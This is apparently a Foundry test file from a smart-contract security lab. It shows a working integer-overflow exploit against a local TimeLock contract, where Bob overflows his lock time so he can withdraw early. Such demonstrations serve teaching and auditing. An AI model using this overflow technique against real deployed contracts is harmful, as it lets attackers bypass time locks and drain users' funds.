// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {TimeLock} from "../src/Overflow.sol";

contract OverflowExploit is Test {
    TimeLock TimeLockContract;
    address alice;
    address bob;

    function setUp() public {
        TimeLockContract = new TimeLock();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testOverflow() public {
        console.log("Alice balance: ", alice.balance);
        console.log("Bob balance: ", bob.balance);

        console.log("Alice deposits 1 Ether...");
        vm.prank(alice);
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Alice balance: ", alice.balance);

        console.log("Bob deposits 1 Ether...");
        vm.startPrank(bob);
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Bob balance: ", bob.balance);

        // Exploit here
        TimeLockContract.increaseLockTime(type(uint256).max + 1 - TimeLockContract.lockTime(bob));

        console.log("Bob will successfully withdraw, because the lock time is overflowed");
        TimeLockContract.withdraw();
        console.log("Bob balance: ", bob.balance);
        vm.stopPrank();

        vm.prank(alice);
        console.log("Alice will fail to withdraw, because the lock time is not expired");
        vm.expectRevert(bytes("Lock time not expired"));
        TimeLockContract.withdraw(); // Should revert
    }
}
